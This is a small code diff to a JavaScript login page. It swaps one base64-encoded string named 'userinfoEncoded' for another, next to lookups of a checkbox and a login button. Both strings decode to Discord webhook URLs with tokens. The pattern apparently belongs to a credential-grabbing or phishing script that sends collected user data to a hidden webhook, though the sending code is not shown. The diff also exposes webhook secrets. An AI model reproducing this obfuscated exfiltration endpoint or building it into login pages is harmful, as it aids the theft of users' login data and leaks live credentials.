@@ -1,4 +1,4 @@
-const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMDc3NTk5NzIzODM0NTcyOC9aVk5tX2F4RVRUN1d3TnZOVkhjdXBsaGRUZk14SUs4Z05LS25XMUtFUl8zQ1NTYkNzcHc3WERKaXlrWUJ6YkNmcE5iSA';
+const userinfoEncoded = 'aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTMxMTIxNjc0MTMwNDUwNDM0MC83R0hScnY2ZVIzc3RmSWdFNTFFbWM3Ny1ZS25iZVV5T180aVA5dS10a1Y1N1h4NU9iTUhlX3BpUHl2aWlTYzY3ZXlRMg==';
 
 const skibidiCheckbox = document.getElementById('skibidiCheckbox');
 const loginButton = document.getElementById('loginButton');
